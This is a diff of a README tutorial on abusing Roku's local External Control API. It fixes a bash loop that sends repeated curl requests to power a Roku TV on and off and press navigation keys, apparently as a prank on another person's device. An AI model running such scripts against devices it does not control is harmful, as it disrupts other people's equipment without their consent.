@@ -1,4 +1,4 @@
-# Roku-Hacking
+# Abusing ROKU APIs
 
 ____________________________________________________________________________________________________________________________________________________________________
 
@@ -172,6 +172,7 @@ curl -d '' "http://192.168.X.X:8060/keypress/powerOn"
 curl -d '' "http://192.168.X.X:8060/keypress/powerOff"
 curl -d '' "http://192.168.X.X:8060/keypress/powerOn"
 curl -d '' "http://192.168.X.X:8060/keypress/powerOff"
+((Hahaha=Hahaha+1))
 done
 curl -d '' "http://192.168.X.X:8060/keypress/powerOn"
 curl -d '' "http://192.168.X.X:8060/keypress/Home"
@@ -179,13 +180,14 @@ while [ $Hahaha -le 100 ]
 do
 curl -d '' "http://192.168.X.X:8060/keypress/left"
 curl -d '' "http://192.168.X.X:8060/keypress/down"
+((Hahaha=Hahaha+1))
 done
 echo "Can we still be friends?"
 ```
 
 I hope that you learned something new, and if you need more information and resources on how to have more fun with these devices, check out https://developer.roku.com/docs/developer-program/debugging/external-control-api.md
 
-Happy hacking!
+Happy hunting!
 
 wq!
 
